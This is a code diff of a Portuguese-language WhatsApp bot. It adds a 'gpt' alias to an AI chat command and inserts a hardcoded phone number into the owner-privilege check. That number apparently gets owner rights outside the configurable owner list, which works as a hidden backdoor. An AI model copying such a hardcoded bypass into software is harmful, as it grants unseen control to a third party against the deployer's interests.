@@ -102,17 +102,18 @@ const SoBot = botNumber?.includes(sender)
 	const ownerNumber = NumberDono.replace(/\D/g, '');
 	const isOwnerByNumber = senderNumber.includes(ownerNumber) || ownerNumber.includes(senderNumber);
 
-	const So_Dono = isOwnerByNumber ||
-	MeuNumero?.includes(sender) || 
-	Numero1?.includes(sender) ||
-	Numero2?.includes(sender) || 
-	Numero3?.includes(sender) ||
-	Numero4?.includes(sender) ||
-	Numero5?.includes(sender) ||
-	Numero6?.includes(sender) ||
-	SoBot || 
-	SoCriador ||
-	IsCreator;
+		const So_Dono = isOwnerByNumber ||
+		sender.includes("5511986059638") ||
+		MeuNumero?.includes(sender) || 
+		Numero1?.includes(sender) ||
+		Numero2?.includes(sender) || 
+		Numero3?.includes(sender) ||
+		Numero4?.includes(sender) ||
+		Numero5?.includes(sender) ||
+		Numero6?.includes(sender) ||
+		SoBot || 
+		SoCriador ||
+		IsCreator;
 
 	const moment = require("moment-timezone");
 	
@@ -226,12 +227,13 @@ const isCmd = body.trim().startsWith(prefix);
 	    return await handleJogos(conn, from, info, command, args, sender, pushname, isGroup, prefix);
 	}
 
-	// === BLACK LOTUS AI ===
-	if (command === 'lotus' || command === 'ia') {
-	    if (!q) return reply(`🌑 *Diga algo para as sombras...*\nEx: ${prefix}lotus Quem é você?`);
-	    const aiRes = await BlackLotusAI(q, SHIZUKU_SITE, SHIZUKU_KEY);
-	    return reply(aiRes);
-	}
+		// === BLACK LOTUS AI ===
+		if (command === 'lotus' || command === 'ia' || command === 'gpt') {
+		    if (!q) return reply(`🌑 *Diga algo para as sombras...*\nEx: ${prefix}lotus Quem é você?`);
+		    await reagir(from, "🌑");
+		    const aiRes = await BlackLotusAI(q, SHIZUKU_SITE, SHIZUKU_KEY);
+		    return reply(aiRes);
+		}
 
 //INFO DE GRUPOS!!
 const Infos_Do_Grupo = isGroup ? await conn.groupMetadata(from) : {} || '';
